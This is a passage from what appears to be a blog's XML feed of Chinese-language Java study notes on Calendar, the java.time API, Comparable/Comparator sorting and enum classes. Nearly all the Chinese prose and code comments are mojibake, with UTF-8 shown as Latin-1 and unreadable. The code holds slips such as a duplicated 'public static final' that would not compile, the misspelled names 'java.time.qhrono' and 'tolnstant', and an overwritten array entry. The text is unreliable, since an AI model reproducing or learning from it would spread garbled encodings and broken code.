calendar.add(Calendar.DAY_OF_MONTH, -3); //åœ¨åŸåŸºç¡€å‡å»ä¸‰å¤© //getTime()ï¼šæ—¥å†ç±»-->Date Date date = calendar.getTime(); // //setTime(): Date --> æ—¥å†ç±» Date da = new Date(); calendar.setTime(da); calendar.getTime(); } } JDK8ä¸­çš„æ—¥æœŸå’Œä¹‹é—´APIæ–°APIå‡ºç°èƒŒæ™¯ï¼š JDK11ä¹‹åjava.util.DAtaè¢«å¯ç”¨äº†äº†ã€‚è€ŒCalendarå¹¶ä¸æ¯”Dateå¥½å¤šå°‘ã€‚ å®ƒä»¬é¢ä¸´çš„é—®é¢˜æ˜¯: å¯å˜æ€§: åƒæ—¥æœŸå’Œæ—¶é—´è¿™æ ·çš„ç±»åº”è¯¥æ˜¯ä¸å¯å˜çš„ã€‚ åç§»æ€§: Dateä¸­çš„å¹´ä»½æ˜¯ä»1900å¼€å§‹çš„ï¼Œè€Œæœˆä»½éƒ½ä»0å¼€å§‹ã€‚ æ ¼å¼åŒ–: æ ¼å¼åŒ–åªå¯¹Dateæœ‰ç”¨ï¼ŒCalendaråˆ™ä¸è¡Œã€‚æ­¤å¤–ï¼Œå®ƒä»¬ä¹Ÿä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„;ä¸èƒ½å¤„ç†é—°ç§’ç­‰ã€‚ æ€»ç»“:å¯¹æ—¥æœŸå’Œæ—¶é—´çš„æ“ä½œä¸€ç›´æ˜¯Javaç¨‹åºå‘˜æœ€ç—›è‹¦çš„åœ°æ–¹ä¹‹ä¸€ã€‚ æ–°æ—¶é—´æ—¥æœŸAPIï¼š ç¬¬ä¸‰æ¬¡å¼•å…¥çš„APIæ˜¯æˆåŠŸçš„ï¼Œå¹¶ä¸”Java8ä¸­å¼•å…¥çš„java.time APIå·²ç»çº æ­£äº†è¿‡å»çš„ç¼ºé™·ï¼Œå°†æ¥å¾ˆé•¿ä¸€æ®µæ—¶é—´å†…å®ƒéƒ½ä¼šä¸ºæˆ‘ä»¬æœåŠ¡ã€‚ Java 8å¸æ”¶äº†Joda-Time çš„ç²¾åï¼Œä»¥ä¸€ä¸ªæ–°çš„å¼€å§‹ä¸ºJavaåˆ›å»ºä¼˜ç§€çš„API.æ–°çš„java.timeä¸­åŒ…å«äº†æ‰€æœ‰å…³äºæœ¬åœ°æ—¥æœŸ(LocalDate) ã€æœ¬åœ°æ—¶é—´(LocalTime) ã€æœ¬åœ°æ—¥æœŸæ—¶é—´(LocalDateTime)ã€æ—¶åŒº (ZonedDateTimeå’ŒæŒç»­æ—¶é—´(Durationï¼‰çš„ç±»ã€‚å†å²æ‚ ä¹…çš„Dateç±»æ–°å¢äº†tolnstant()æ–¹æ³•,ç”¨äºæŠŠ Dateè½¬æ¢æˆæ–°çš„è¡¨ç¤ºå½¢å¼ã€‚è¿™äº›æ–°å¢çš„æœ¬åœ°åŒ–æ—¶é—´æ—¥æœŸAPIå¤§å¤§ç®€åŒ–äº†æ—¥æœŸæ—¶é—´å’Œæœ¬åœ°åŒ–çš„ç®¡ç†ã€‚ java.time -åŒ…å«å€¼å¯¹è±¡çš„åŸºç¡€åŒ… java.time.qhrono-æä¾›å¯¹ä¸åŒçš„æ—¥å†ç³»ç»Ÿçš„è®¿é—® java.time.format-æ ¼å¼åŒ–å’Œè§£ææ—¶é—´å’Œæ—¥æœŸ java.time.temporal-åŒ…æ‹¬åº•å±‚æ¡†æ¶å’Œæ‰©å±•ç‰¹æ€§ java.time.zone-åŒ…å«æ—¶åŒºæ”¯æŒçš„ç±» LocalDateã€LocalTimeã€LocalDateTimeç±»æ˜¯å…¶ä¸­è¾ƒé‡è¦çš„å‡ ä¸ªç±»ï¼Œå®ƒä»¬çš„å®ä¾‹æ˜¯ä¸å¯å˜çš„å¯¹è±¡ï¼Œåˆ†åˆ«è¡¨ç¤ºä½¿ç”¨ISO-8601æ—¥å†ç³»ç»Ÿçš„æ—¥æœŸã€æ—¶é—´ã€æ—¥æœŸå’Œæ—¶é—´ã€‚å®ƒä»¬æä¾›äº†ç®€å•çš„æœ¬åœ°æ—¥æœŸæˆ–æ—¶é—´ï¼Œå¹¶ä¸åŒ…å«å½“å‰çš„æ—¶é—´ä¿¡æ¯ï¼Œä¹Ÿä¸åŒ…å«ä¸æ—¶åŒºç›¸å…³çš„ä¿¡æ¯ã€‚ LocalDateä»£è¡¨IOSæ ¼å¼(yyyy-MM-ddï¼‰çš„æ—¥æœŸ,å¯ä»¥å­˜å‚¨ç”Ÿæ—¥ã€çºªå¿µæ—¥ç­‰æ—¥æœŸ LocalTimeè¡¨ç¤ºä¸€ä¸ªæ—¶é—´ï¼Œè€Œä¸æ˜¯æ—¥æœŸã€‚ LocalDateTimeæ˜¯ç”¨æ¥è¡¨ç¤ºæ—¥æœŸå’Œæ—¶é—´çš„ï¼Œè¿™æ˜¯ä¸€ä¸ªæœ€å¸¸ç”¨çš„ç±»ä¹‹ä¸€ã€‚ /* LocalDate, LocalTime, LocalDateTime(ä½¿ç”¨è¾ƒå¤š) ç±»ä¼¼äºCalendar */ @Test public void test_LocalXXX(){ //å®ä¾‹åŒ–1: //now() è·å–å½“å‰æ—¥æœŸæˆ–æ—¶é—´ LocalDate ldate = LocalDate.now(); LocalTime ltime = LocalTime.now(); LocalDateTime ldatetime = LocalDateTime.now(); //ä½¿ç”¨çš„è¾ƒå¤š System.out.println(ldate); System.out.println(ltime); System.out.println(ldatetime); //å®ä¾‹åŒ–2: of() è®¾ç½®æŒ‡å®šæ—¶é—´, å‚æ•°æ²¡æœ‰åç§»é‡ LocalDateTime nowtime = LocalDateTime.of(2020,10,10,8,8,8); System.out.println(nowtime); System.out.println("*******"); //getXXX() è·å– System.out.println(ldatetime.getDayOfMonth()); // è·å–æ—¶é—´æ˜¯æœ¬æœˆçš„ç¬¬å‡ å¤© System.out.println(ldatetime.getDayOfWeek()); System.out.println(ldatetime.getDayOfYear()); System.out.println(ldatetime.getMonthValue()); //è·å–æœˆä»½ System.out.println(ldatetime.getMinute()); //withXXX() è®¾ç½® // è¿™ç§è®¾ç½®æ˜¯ä¸å¯å˜çš„ LocalDate localDate1 = ldate.withDayOfMonth(10); //ä¿®æ”¹è®¾ç½®å€¼ï¼Œä¿®æ”¹å½“å‰æ˜¯æœˆçš„ç¬¬å‡ å¤© System.out.println(localDate1); //å®ƒæ”¹äº† System.out.println(ldate); //åŸæ¥çš„ä¸å—å½±å“ LocalDateTime ll = ldatetime.withHour(5); //åŠ  LocalDateTime lll = ldatetime.plusMonths(3); //åœ¨åŸæ¥åŸºç¡€ä¸ŠåŠ ä¸Šäº†ä¸‰ä¸ªæœˆ System.out.println(lll); //åŠ äº†ä¹‹åçš„ System.out.println(ldatetime); //åŸæ¥çš„è¿˜æ˜¯ä¸å˜çš„ //å‡ LocalDateTime llll = ldatetime.minusDays(6); //å‡å»6å¤© System.out.println(llll); } Instant(ç¬æ—¶)ï¼š Instantåªæ˜¯ç®€å•çš„è¡¨ç¤ºè‡ªå…ƒå¹´å¼€å§‹çš„ç§’ ç±»ä¼¼java.util.Date */ @Test public void testInstant(){ //now() è·å–æœ¬åˆå­åˆçº¿å¯¹åº”çš„æ ‡å‡†æ—¶é—´ Instant instant = Instant.now(); System.out.println(instant); //é»˜è®¤æ—¶é—´æ˜¯ä¸å¯¹çš„ï¼ŒæŒ‰UTCæ—¶é—´ç®—æ˜¯åœ¨æœ¬åˆå­åˆçº¿ä½ç½®çš„æ—¶é—´ï¼Œå’±åœ¨ä¸œå…«åŒºéœ€è¦åŠ ä¸€ä¸‹ // æˆ‘ä»¬é‡‡ç”¨è¿™ç§æ–¹å¼ï¼Œæ·»åŠ æ—¶é—´çš„åç§»é‡ OffsetDateTime offsetDateTime = instant.atOffset(ZoneOffset.ofHours(8)); //ä¸œå…«åŒº System.out.println(offsetDateTime); //è·å–æ¯«ç§’æ•° --> Date.getTime() long mi = instant.toEpochMilli(); System.out.println(mi); // //é€šè¿‡ç»™å®šçš„æ¯«ç§’æ•°ï¼Œè·å–Instantå®ä¾‹ --> Date(Long millis) Instant instant2 = Instant.ofEpochMilli(1611413025604L); System.out.println(instant2); } æ ¼å¼åŒ–ä¸è§£ææ—¥æœŸæˆ–æ—¶é—´ï¼š /* DateTimeFormatter: æ ¼å¼åŒ–æˆ–è§£ææ—¥æœŸæˆ–æ—¶é—´ ç±»ä¼¼äºSimpleDateFormat */ @Test public void testDateTimeFormatter(){ // LocalDateTime, LocalDate, LocalTime //å®ä¾‹åŒ–1ï¼šé¢„å®šä¹‰çš„æ ‡å‡†æ ¼å¼ DateTimeFormatter formatter1 = DateTimeFormatter.ISO_LOCAL_DATE_TIME; //æ ¼å¼åŒ–:æ—¥æœŸ-->str LocalDateTime localDateTime = LocalDateTime.now(); String str1 = formatter1.format(localDateTime); System.out.println(str1); //è§£æ: str-->æ—¥æœŸ TemporalAccessor parse = formatter1.parse("2021-01-23T22:51:32.392"); //å®ä¾‹åŒ–2ï¼šæœ¬åœ°åŒ–ç›¸å…³çš„æ ¼å¼(ä»¥æŸä¸ªå‡½æ•°æˆ–å‚æ•°ä¸¾ä¾‹) // ofLocalizedDateTime,ofLocalizedDate DateTimeFormatter formatter2 = DateTimeFormatter.ofLocalizedDateTime(FormatStyle.LONG); //æ ¼å¼åŒ– String str2 = formatter2.format(localDateTime); // ofLocalizedDate DateTimeFormatter formatter3 = DateTimeFormatter.ofLocalizedDate(FormatStyle.FULL); String str3 = formatter3.format(LocalDate.now()); System.out.println(str3); //è§£æ... //å®ä¾‹åŒ–3ï¼šè‡ªå®šä¹‰çš„æ ¼å¼(ä½¿ç”¨çš„æœ€å¤š -->é‡ç‚¹) DateTimeFormatter format1 = DateTimeFormatter.ofPattern("yyyy-MM-dd hh:mm:ss"); //æ ¼å¼åŒ– String s1 = format1.format(LocalDateTime.now()); System.out.println(s1); //è§£æ TemporalAccessor accessor = format1.parse("2020-8-8 08:08:08"); System.out.println(accessor); } javaå…¶ä»–æ—¶é—´apiï¼š ä¸ä¼ ç»Ÿæ—¥æœŸçš„å¤„ç†è½¬æ¢ï¼š ç”¨åˆ°çš„æ—¶å€™æŸ¥ä¸€ä¸‹å°±è¡Œ Javaæ¯”è¾ƒå™¨(é‡è¦) æ¶‰åŠåˆ°å¯¹è±¡æ’åºï¼Œå°±è¦ç”¨ä¸‹é¢ä¸¤ç§ï¼Œè‡³äºç”¨å“ªç§å°±è‡ªå·±é€‰å§ java.lang.Comparable ä¸€åŠ³æ°¸é€¸ï¼Œä¸€æ—¦å®ç°ï¼Œåœ¨ä»»ä½•ä½ç½®éƒ½å¯ä»¥æ¯”è¾ƒå¤§å° java.util.Comparator ä¸´æ—¶ç”¨ä¸€ä¸‹æ—¶å€™çš„æ¯”è¾ƒ Comparablepackage cn.xpshuai.java3; import org.junit.Test; import java.util.Arrays; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-24 17:07 * @åŠŸèƒ½ï¼š Javaæ¯”è¾ƒå™¨ * * Javaä¸­çš„å¯¹è±¡ï¼Œæ­£å¸¸æƒ…å†µä¸‹åªèƒ½è¿›è¡Œæ¯”è¾ƒï¼›==, !=, ä¸èƒ½ä½¿ç”¨: > &lt; * ä½†æ˜¯åœ¨å¼€å‘åœºæ™¯ä¸­ï¼Œæˆ‘ä»¬éœ€è¦å¯¹å¤šä¸ªå¯¹è±¡è¿›è¡Œæ’åºå¯ä»¥æ¯”è¾ƒå¤§å° *å®ç°å¯¹è±¡æ’åºçš„æ–¹å¼æœ‰ä¸¤ç§ï¼š * - è‡ªç„¶æ’åº: java.lang.Comparable * - å®šåˆ¶æ’åº: java.util.Comparator * * * 1.Comparableæ¥å£ * * * 2.Comparatoræ¥å£ */ public class ComparableTest { /* Comparableä½¿ç”¨ä¸¾ä¾‹ 1.Stringç­‰åŒ…è£…ç±»å®ç°äº†Comparableæ¥å£ï¼Œé‡å†™äº†compareTo()æ–¹æ³•,ç»™å‡ºäº†æ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡å¤§å°çš„å®ç° 2.Stringç­‰åŒ…è£…ç±»é‡å†™compareTo()ä»¥åï¼Œè¿›è¡Œäº†ä»å°åˆ°å¤§æ’åˆ— 3.å®ç°compareTo()çš„è§„åˆ™: å¦‚æœå½“å‰å¯¹è±¡thiså¤§äºå½¢å‚å¯¹è±¡ï¼Œåˆ™è¿”å›æ­£æ•´æ•°ï¼› å¦‚æœå½“å‰å¯¹è±¡thiså°äºå½¢å‚å¯¹è±¡ï¼Œåˆ™è¿”å›è´Ÿæ•´æ•°ï¼› å¦‚æœå½“å‰å¯¹è±¡thisç­‰äºå½¢å‚å¯¹è±¡objï¼Œåˆ™è¿”å›0ã€‚ */ @Test public void test1(){ String[] arr = new String[]{"DD", "GG", "BB", "JJ","MM","AA"}; Arrays.sort(arr); //æ’åº(å…¶å®ä¹Ÿæ˜¯Stringå®ç°äº†Comparableæ¥å£) } } è‡ªå®šä¹‰ç±»å®ç°Comparableè‡ªç„¶æ’åºè‡ªå®šä¹‰ç±»ï¼š package cn.xpshuai.java3; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-24 17:26 * @åŠŸèƒ½ï¼š */ public class Goods implements Comparable{ private String name; private double price; public Goods() { } public Goods(String name, double price) { this.name = name; this.price = price; } public String getName() { return name; } public void setName(String name) { this.name = name; } public double getPrice() { return price; } public void setPrice(double price) { this.price = price; } @Override public String toString() { return "Goods{" + "name='" + name + '\'' + ", price=" + price + '}'; } //å®ç°è¿™ä¸ªæ–¹æ³• //æŒ‡æ˜å•†å“æ¯”è¾ƒå¤§å°çš„æ–¹å¼(è¿™é‡Œè‡ªå®šä¹‰æ¯”è¾ƒä»·æ ¼ä»ä½åˆ°é«˜æ’åºï¼Œå¦‚æœéœ€è¦ï¼Œå¯ä»¥ç»§ç»­åµŒå¥—æ¯”è¾ƒ) @Override public int compareTo(Object o) { if(o instanceof Goods){ Goods goods = (Goods)o; if(this.price > goods.price){ return 1; }else if(this.price &lt; goods.price){ return -1; }else { // return 0; return this.name.compareTo(goods.name); //å¦‚æœéœ€è¦ï¼Œå¯ä»¥ç»§ç»­åµŒå¥—æ¯”è¾ƒ, æ¯”å¦‚ä»·æ ¼ä¸€æ ·å°±å†æ¯”è¾ƒå•†å“åç§° } } throw new RuntimeException("ä¼ å…¥çš„æ•°æ®ç±»å‹ä¸ä¸€è‡´!"); } } package cn.xpshuai.java3; import org.junit.Test; import java.util.Arrays; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-24 17:07 * @åŠŸèƒ½ï¼š Javaæ¯”è¾ƒå™¨ * * Javaä¸­çš„å¯¹è±¡ï¼Œæ­£å¸¸æƒ…å†µä¸‹åªèƒ½è¿›è¡Œæ¯”è¾ƒï¼›==, !=, ä¸èƒ½ä½¿ç”¨: > &lt; * ä½†æ˜¯åœ¨å¼€å‘åœºæ™¯ä¸­ï¼Œæˆ‘ä»¬éœ€è¦å¯¹å¤šä¸ªå¯¹è±¡è¿›è¡Œæ’åºå¯ä»¥æ¯”è¾ƒå¤§å° *å®ç°å¯¹è±¡æ’åºçš„æ–¹å¼æœ‰ä¸¤ç§ï¼š * - è‡ªç„¶æ’åº: java.lang.Comparable * - å®šåˆ¶æ’åº: java.util.Comparator * * * 1.Comparableæ¥å£ * * * 2.Comparatoræ¥å£ */ public class ComparableTest { /* Comparable(è‡ªç„¶æ’åº)ä½¿ç”¨ä¸¾ä¾‹ 1.Stringç­‰åŒ…è£…ç±»å®ç°äº†Comparableæ¥å£ï¼Œé‡å†™äº†compareTo()æ–¹æ³•,ç»™å‡ºäº†æ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡å¤§å°çš„å®ç° 2.Stringç­‰åŒ…è£…ç±»é‡å†™compareTo()ä»¥åï¼Œè¿›è¡Œäº†ä»å°åˆ°å¤§æ’åˆ— 3.å®ç°compareTo()çš„è§„åˆ™: å¦‚æœå½“å‰å¯¹è±¡thiså¤§äºå½¢å‚å¯¹è±¡ï¼Œåˆ™è¿”å›æ­£æ•´æ•°ï¼› å¦‚æœå½“å‰å¯¹è±¡thiså°äºå½¢å‚å¯¹è±¡ï¼Œåˆ™è¿”å›è´Ÿæ•´æ•°ï¼› å¦‚æœå½“å‰å¯¹è±¡thisç­‰äºå½¢å‚å¯¹è±¡objï¼Œåˆ™è¿”å›0ã€‚ 4.å¯¹äºè‡ªå®šä¹‰ç±»ï¼Œå¦‚æœéœ€è¦æ’åºï¼Œå¯ä»¥è®©è‡ªå®šä¹‰ç±»å®ç°Comparableæ¥å£ï¼Œé‡å†™compareTo()æ–¹æ³• åœ¨compareTo(obj)å†™å¦‚ä½•æ’åº */ @Test public void test1(){ String[] arr = new String[]{"DD", "GG", "BB", "JJ","MM","AA"}; Arrays.sort(arr); //æ’åº(å…¶å®ä¹Ÿæ˜¯Stringå®ç°äº†Comparableæ¥å£) } /* ã€è‡ªå®šä¹‰ç±»å®ç°Comparableè‡ªç„¶æ’åºã€‘ è¿™é‡Œè‡ªå®šä¹‰ç±»æ˜¯Goods.java å¯¹äºè‡ªå®šä¹‰ç±»ï¼Œå¦‚æœéœ€è¦æ’åºï¼Œå¯ä»¥è®©è‡ªå®šä¹‰ç±»å®ç°Comparableæ¥å£ï¼Œé‡å†™compareTo()æ–¹æ³• åœ¨compareTo(obj)å†™å¦‚ä½•æ’åº */ @Test public void test2(){ Goods[] arr = new Goods[4]; arr[0] = new Goods("è”æƒ³", 65); arr[1] = new Goods("å°ç±³", 12); arr[2] = new Goods("åä¸º", 65); arr[3] = new Goods("ç½—æŠ€", 101); Arrays.sort(arr); //åŸå§‹æƒ…å†µä¸‹ï¼Œä¸èƒ½æ‰§è¡Œï¼Œéœ€è¦åœ¨è‡ªå®šä¹‰ç±»ä¸­å®ç°å¹¶é‡å†™ System.out.println(Arrays.toString(arr)); // ç»§æ‰¿å¹¶é‡å†™ä¹‹å } } Comparatoræ¥å£ /* Comparatoræ¥å£(å®šåˆ¶æ’åº) 1.èƒŒæ™¯: å½“å…ƒç´ çš„ç±»å‹æ²¡æœ‰å®ç°java.Lang.ComparabLeæ¥å£è€Œåˆä¸æ–¹ä¾¿ä¿®æ”¹ä»£ç , æˆ–è€…å®ç°äº†java.Lang.comparableæ¥å£çš„æ’åºè§„åˆ™ä¸é€‚åˆå½“å‰çš„æ“ä½œ, é‚£ä¹ˆå¯ä»¥è€ƒæ€ä½¿ç”¨Comparatorçš„å¯¹è±¡æ¥æ’åº 2.é‡å†™compare(Object o1,0bject o2)æ–¹æ³•ï¼Œæ¯”è¾ƒo1å’Œo2çš„å¤§å°: å¦‚æœæ–¹æ³•è¿”å›æ­£æ•´æ•°,åˆ™è¡¨ç¤ºo1å¤§äºo2 å¦‚æœæ–¹æ³•è¿”å›è´Ÿæ•´æ•°,åˆ™è¡¨ç¤ºo1å°äºo2 å¦‚æœæ–¹æ³•è¿”å›0,åˆ™è¡¨ç¤ºo1ç­‰äºo2 */ @Test public void test3() { String[] arr = new String[]{"DD", "GG", "BB", "JJ","MM","AA"}; Arrays.sort(arr, new Comparator&lt;String>() { //ä½¿ç”¨åŒ¿åå†…éƒ¨ç±» @Override public int compare(String o1, String o2) { //å®ç°compareæ–¹æ³• //æŒ‡æ˜o1å’Œo2æ€ä¹ˆæ’ if(o1 instanceof String &amp;&amp; o2 instanceof String){ String s1 = (String)o1; String s2 = (String)o2; return -s1.compareTo(s2); //ä»å¤§åˆ°å°æ¥æ’åˆ— } throw new RuntimeException("è¾“å…¥çš„ç±»å‹ä¸ä¸€è‡´"); } }); } è‡ªå®šä¹‰ç±»å®ç°Comparatorå®šåˆ¶æ’åºè‡ªå®šä¹‰ç±»: // Goodsç±»ï¼ŒåŒå‰é¢ /* ã€è‡ªå®šä¹‰ç±»å®ç°Comparatorå®šåˆ¶æ’åºã€‘ è¿™é‡Œè‡ªå®šä¹‰ç±»æ˜¯Goods.java */ @Test public void test4(){ Goods[] arr = new Goods[4]; arr[0] = new Goods("è”æƒ³", 65); arr[1] = new Goods("å°ç±³", 12); arr[2] = new Goods("åä¸º", 65); arr[3] = new Goods("ç½—æŠ€", 101); arr[3] = new Goods("ç½—æŠ€", 100); Arrays.sort(arr, new Comparator&lt;Goods>() { //æŒ‡æ˜å•†å“æ¯”è¾ƒå¤§å°çš„æ–¹å¼(è¿™é‡Œè‡ªå®šä¹‰, å…ˆæŒ‰äº§å“åç§°ä»ä½åˆ°é«˜ï¼Œå†æ¯”è¾ƒä»·æ ¼ä»é«˜åˆ°ä½æ’åº) @Override public int compare(Goods o1, Goods o2) { if(o1 instanceof Goods &amp;&amp; o2 instanceof Goods){ Goods goods1 = (Goods)o1; Goods goods2 = (Goods)o2; if(goods1.getName().equals(goods2.getName())){ return -Double.compare(goods1.getPrice(), goods2.getPrice()); //å¦‚æœåç§°ä¸€æ ·ï¼Œå°±å†æ¯”è¾ƒä»·æ ¼ }else { return goods1.getName().compareTo(goods2.getName()); } } throw new RuntimeException("ä¼ å…¥çš„æ•°æ®ç±»å‹ä¸ä¸€è‡´!"); } }); //åŸå§‹æƒ…å†µä¸‹ï¼Œä¸èƒ½æ‰§è¡Œï¼Œéœ€è¦åœ¨è‡ªå®šä¹‰ç±»ä¸­å®ç°å¹¶é‡å†™ System.out.println(Arrays.toString(arr)); // ç»§æ‰¿å¹¶é‡å†™ä¹‹å } Systemç±» Mathç±» BigIntegerä¸BigDecimal document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Javaå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>String</tag>
        <tag>StringBuffer</tag>
        <tag>StringBuilder</tag>
        <tag>Javaæ¯”è¾ƒå™¨</tag>
        <tag>Math</tag>
        <tag>æ—¶é—´ç±»</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javaå­¦ä¹ ä¹‹æšä¸¾ç±»]]></title>
    <url>%2Fposts%2F31393%2F</url>
    <content type="text"><![CDATA[æ¦‚è¿° æšä¸¾ç±»çš„å®ç° JDK1.5ä¹‹å‰éœ€è¦è‡ªå®šä¹‰æšä¸¾ç±» JDK 1.5æ–°å¢çš„enumå…³é”®å­—ç”¨äºå®šä¹‰æšä¸¾ç±» è‹¥æšä¸¾åªæœ‰ä¸€ä¸ªå¯¹è±¡,åˆ™å¯ä»¥ä½œä¸ºä¸€ç§å•ä¾‹æ¨¡å¼çš„å®ç°æ–¹å¼ã€‚ æšä¸¾ç±»çš„å±æ€§ æšä¸¾ç±»å¯¹è±¡çš„å±æ€§ä¸åº”å…è®¸è¢«æ”¹åŠ¨,æ‰€ä»¥åº”è¯¥ä½¿ç”¨private finalä¿®é¥° æšä¸¾ç±»çš„ä½¿ç”¨private finalä¿®é¥°çš„å±æ€§åº”è¯¥åœ¨æ„é€ å™¨ä¸­ä¸ºå…¶èµ‹å€¼ è‹¥æšä¸¾ç±»æ˜¾å¼çš„å®šä¹‰äº†å¸¦å‚æ•°çš„æ„é€ å™¨,åˆ™åœ¨åˆ—å‡ºæšä¸¾å€¼æ—¶ä¹Ÿå¿…é¡»å¯¹åº”çš„ä¼ å…¥å…¬æ•° å®šä¹‰æšä¸¾ç±»(ä¸¤ç§æ–¹å¼)package cn.xpshuai.java1; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-24 18:18 * @åŠŸèƒ½ï¼šæšä¸¾ç±» * * ç±»çš„å¯¹è±¡åªæœ‰æœ‰é™ä¸ªã€ç¡®å®šçš„ã€‚æˆ‘ä»¬ç§°æ­¤ç±»ä¸ºæšä¸¾ç±» * å½“éœ€è¦å®šä¹‰ä¸€ç»„å¸¸é‡æ—¶ï¼Œå¼ºçƒˆå»ºè®®ä½¿ç”¨æšä¸¾ç±» * å¦‚æœæšä¸¾ç±»ä¸­åªæœ‰ä¸€ä¸ªå¯¹è±¡ï¼Œåˆ™å¯ä»¥ä½œä¸ºå•ä¾‹æ¨¡å¼çš„å®ç°æ–¹å¼ã€‚ * * * å¦‚ä½•å®šä¹‰æšä¸¾ç±» * æ–¹æ³•1ï¼šjdk5.0ä¹‹å‰ï¼šä¹‹å®šä¹‰æšä¸¾ç±» * æ–¹æ³•2ï¼šjdk5.0ï¼Œå¯ä»¥ä½¿ç”¨enumå…³é”®å­—å®šä¹‰æšä¸¾ç±»(å¸¸ç”¨) */ public class EnumTest { public static void main(String[] args) { Season spring = Season.SPRING; System.out.println(spring); // //jdk5.0ï¼Œå¯ä»¥ä½¿ç”¨enumå…³é”®å­—å®šä¹‰æšä¸¾ç±»(å¸¸ç”¨) //å®šä¹‰çš„æšä¸¾ç±»ç»§æ‰¿äºjava.lang.Enum Season1 spring1 = Season1.SPRING; System.out.println(spring1); System.out.println(Season1.class.getSuperclass()); } } //jdk5.0ä¹‹å‰ï¼šè‡ªå®šä¹‰æšä¸¾ç±» class Season{ //1.å£°æ˜Seasonå¯¹è±¡çš„å±æ€§ private final String seasonName; private final String seasonDesc; //2.ç§æœ‰åŒ–ç±»çš„æ„é€ å™¨, å¹¶ç»™å¯¹è±¡å±æ€§èµ‹å€¼ private Season(String seasonName, String seasonDesc){ this.seasonName = seasonName; this.seasonDesc = seasonDesc; } //3.æä¾›å½“å‰æšä¸¾ç±»çš„å¯¹è±¡çš„å¤šä¸ªå¯¹è±¡ public static final public static final Season SPRING = new Season("æ˜¥å¤©", "æ˜¥æš–èŠ±å¼€"); public static final Season SUMMER = new Season("å¤å¤©", "å¤æ—¥ç‚ç‚"); public static final Season AUTOM = new Season("ç§‹å¤©", "ç§‹é«˜æ°”çˆ½"); public static final Season WINTER = new Season("å†¬å¤©", "å†°å¤©é›ªåœ°"); //4.å…¶ä»–è¯‰æ±‚ï¼šè·å–æšä¸¾ç±»å¯¹è±¡çš„å±æ€§ public String getSeasonName() { return seasonName; } public String getSeasonDesc() { return seasonDesc; } //4.å…¶ä»–è¯‰æ±‚ï¼šæä¾›toString() @Override public String toString() { return "Season{" + "seasonName='" + seasonName + '\'' + ", seasonDesc='" + seasonDesc + '\'' + '}'; } } // //jdk5.0ï¼Œå¯ä»¥ä½¿ç”¨enumå…³é”®å­—å®šä¹‰æšä¸¾ç±»(å¸¸ç”¨) enum Season1{ // 1.æä¾›å½“å‰æšä¸¾ç±»çš„å¸ä¹¡ï¼Œå¤šä¸ªå¯¹è±¡ä¹‹é—´ç”¨,éš”å¼€ SPRING("æ˜¥å¤©", "æ˜¥æš–èŠ±å¼€"), SUMMER("å¤å¤©", "å¤æ—¥ç‚ç‚"), AUTOM("ç§‹å¤©", "ç§‹é«˜æ°”çˆ½"), WINTER("å†¬å¤©", "å†°å¤©é›ªåœ°"); //2.å£°æ˜Seasonå¯¹è±¡çš„å±æ€§ private final String seasonName; private final String seasonDesc; //2.ç§æœ‰åŒ–ç±»çš„æ„é€ å™¨, å¹¶ç»™å¯¹è±¡å±æ€§èµ‹å€¼ private Season1(String seasonName, String seasonDesc){ this.seasonName = seasonName; this.seasonDesc = seasonDesc; } //3.æä¾›å½“å‰æšä¸¾ç±»çš„å¯¹è±¡çš„å¤šä¸ªå¯¹è±¡ public static final //4.å…¶ä»–è¯‰æ±‚ï¼šè·å–æšä¸¾ç±»å¯¹è±¡çš„å±æ€§ public String getSeasonName() { return seasonName; } public String getSeasonDesc() { return seasonDesc; } //4.å…¶ä»–è¯‰æ±‚ï¼šæä¾›toString() } Enumç±»çš„ä¸»è¦æ–¹æ³• package cn.xpshuai.java1; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-24 18:18 * @åŠŸèƒ½ï¼šæšä¸¾ç±» * * ç±»çš„å¯¹è±¡åªæœ‰æœ‰é™ä¸ªã€ç¡®å®šçš„ã€‚æˆ‘ä»¬ç§°æ­¤ç±»ä¸ºæšä¸¾ç±» * å½“éœ€è¦å®šä¹‰ä¸€ç»„å¸¸é‡æ—¶ï¼Œå¼ºçƒˆå»ºè®®ä½¿ç”¨æšä¸¾ç±» * å¦‚æœæšä¸¾ç±»ä¸­åªæœ‰ä¸€ä¸ªå¯¹è±¡ï¼Œåˆ™å¯ä»¥ä½œä¸ºå•ä¾‹æ¨¡å¼çš„å®ç°æ–¹å¼ã€‚ * * * å¦‚ä½•å®šä¹‰æšä¸¾ç±» * æ–¹æ³•1ï¼šjdk5.0ä¹‹å‰ï¼šä¹‹å®šä¹‰æšä¸¾ç±» * æ–¹æ³•2ï¼šjdk5.0ï¼Œå¯ä»¥ä½¿ç”¨enumå…³é”®å­—å®šä¹‰æšä¸¾ç±»(å¸¸ç”¨) * * * Enumä¸­å¸¸ç”¨æ–¹æ³•ï¼š * value() è¿”å›æšä¸¾ç±»å‹çš„å¯¹è±¡æ•°æ® * valueOf() å¯ä»¥æŠŠä¸€ä¸ªå­—ç¬¦ä¸²è½¬ä¸ºå¯¹åº”çš„æšä¸¾ç±»å¯¹è±¡ï¼ˆè¦æ±‚å­—ç¬¦ä¸²å¿…é¡»æ˜¯æšä¸¾ç±»å¯¹è±¡çš„"åå­—"ï¼‰ * toString() è¿”å›å½“å‰æšä¸¾ç±»å¯¹è±¡å¸¸é‡çš„åç§° */ public class EnumTest { public static void main(String[] args) { Season spring = Season.SPRING; System.out.println(spring); // //jdk5.0ï¼Œå¯ä»¥ä½¿ç”¨enumå…³é”®å­—å®šä¹‰æšä¸¾ç±»(å¸¸ç”¨) 